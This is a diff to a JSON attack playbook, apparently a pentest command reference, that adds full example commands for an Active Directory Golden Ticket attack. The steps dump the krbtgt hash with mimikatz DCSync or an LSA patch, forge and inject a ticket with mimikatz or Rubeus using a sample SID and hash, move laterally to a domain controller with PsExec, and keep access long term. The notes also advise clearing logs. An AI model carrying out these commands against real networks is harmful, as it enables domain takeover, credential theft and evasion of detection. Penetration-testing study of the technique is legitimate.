@@ -256,32 +256,64 @@
           "title": "Phase 2: Extract krbtgt Account Hash",
           "notes": "Obtain the krbtgt account NTLM hash using either DCSync (remote, stealthy) or LSA dump (requires DC access, noisy). DCSync is preferred in most scenarios as it doesn't require logging into the DC and generates less suspicious activity. Both methods require Domain Admin privileges or equivalent replication rights.",
           "commands": [
-            "ad-golden-ticket-dcsync-krbtgt",
-            "ad-golden-ticket-lsa-dump-krbtgt"
+            {
+              "id": "ad-golden-ticket-dcsync-krbtgt",
+              "example": "mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt",
+              "shows": "Output contains: 'Domain : <DOMAIN> / S-1-5-21-...'"
+            },
+            {
+              "id": "ad-golden-ticket-lsa-dump-krbtgt",
+              "example": "mimikatz # lsadump::lsa /patch",
+              "shows": "Output contains: 'Privilege '20' OK' (from privilege::debug)"
+            }
           ]
         },
         {
           "title": "Phase 3: Create and Inject Golden Ticket",
           "notes": "Forge a Kerberos TGT using the krbtgt hash and inject it into memory. This can be performed from a non-privileged user context on any workstation (domain-joined or not). Purge existing tickets first for clean injection. Verify ticket creation with klist before attempting lateral movement.",
           "commands": [
-            "ad-golden-ticket-purge-tickets",
-            "ad-golden-ticket-mimikatz-create",
-            "ad-golden-ticket-rubeus-create",
-            "ad-golden-ticket-verify-klist"
+            {
+              "id": "ad-golden-ticket-purge-tickets",
+              "example": "mimikatz # kerberos::purge",
+              "shows": "Output: 'Ticket(s) purge for current session is OK'"
+            },
+            {
+              "id": "ad-golden-ticket-mimikatz-create",
+              "example": "mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt",
+              "shows": "Output: 'User      : <username>'"
+            },
+            {
+              "id": "ad-golden-ticket-rubeus-create",
+              "example": "Rubeus.exe golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /rc4:1693c6cefafffc7af11ef34d1c788f47 /ptt",
+              "shows": "Output: '[*] Action: Build TGT'"
+            },
+            {
+              "id": "ad-golden-ticket-verify-klist",
+              "example": "klist",
+              "shows": "Output contains: '#0>     Client: <username> @ <DOMAIN>'"
+            }
           ]
         },
         {
           "title": "Phase 4: Lateral Movement and Domain Access",
           "notes": "Use the Golden Ticket to authenticate to domain resources and perform lateral movement. CRITICAL: Always use hostnames or FQDNs, never IP addresses (IPs force NTLM authentication which bypasses Kerberos tickets). The Golden Ticket grants domain-wide access to all systems and resources.",
           "commands": [
-            "ad-golden-ticket-psexec-use"
+            {
+              "id": "ad-golden-ticket-psexec-use",
+              "example": "PsExec.exe \\\\DC1 cmd.exe",
+              "shows": "Output: 'PsExec v2.4 - Execute processes remotely'"
+            }
           ]
         },
         {
           "title": "Phase 5: Persistence and Cleanup (Optional)",
           "notes": "Golden Tickets provide long-term persistence because krbtgt password changes are rare. Save the krbtgt hash securely for future ticket creation. Tickets can be created offline and used when reconnecting to the network. For OPSEC, purge tickets and clear logs when operations are complete.",
           "commands": [
-            "ad-golden-ticket-cleanup"
+            {
+              "id": "ad-golden-ticket-cleanup",
+              "example": "mimikatz # kerberos::purge",
+              "shows": "Output: 'Ticket(s) purge for current session is OK'"
+            }
           ]
         }
       ],
